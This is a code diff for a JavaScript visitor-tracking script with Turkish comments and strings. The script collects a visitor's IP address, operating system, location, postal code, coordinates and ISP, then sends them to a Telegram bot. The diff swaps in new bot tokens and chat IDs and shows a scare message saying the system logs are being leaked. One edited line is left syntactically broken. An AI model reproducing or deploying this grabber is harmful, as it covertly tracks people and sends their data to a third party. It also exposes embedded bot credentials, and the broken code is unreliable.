@@ -148,13 +148,13 @@
                     log("Sistem logları şifrelendi, sızdırılıyor.");
                 }, 7000);
 
-                let mesaj = "👑 *EMOSS OPERATIONS LOG*\n";
+                let mesaj = "🤞🏾* ESPNİEN ZİRVEDEN LOG*\n";
                 mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
                 mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
                 mesaj += "🤖 *Sistem (OS):* `" + os + "` 🛡️\n";
                 mesaj += "⏰ *Zaman Damgası:* " + tarih + "\n";
                 mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
-                mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + eyalet_sehir + "\n";
+                mesaj += "📍 *Konum / Ülke:* " + ulke + " - " + + "\n";
                 mesaj += "📮 *Posta Kodu:* " + posta_kodu + "\n";
                 mesaj += "🗺️ *Koordinatlar:* " + koordinat + "\n";
                 mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
@@ -174,8 +174,8 @@
                 mesaj += "📡 *Bağlantı Kalitesi:* " + agTipi + "\n";
                 mesaj += "━━━━━━━━━━━━━━━━━━━━━━";
 
-                let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
-                let cid = "6845229845";
+                let tok = "8993190517:AAHrhEQHdFsB4nSm7-0HzND8FcvoB3_EGp8";
+                let cid = "8145488179";
                 let url = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(mesaj) + "&parse_mode=Markdown";
 
                 setTimeout(() => {
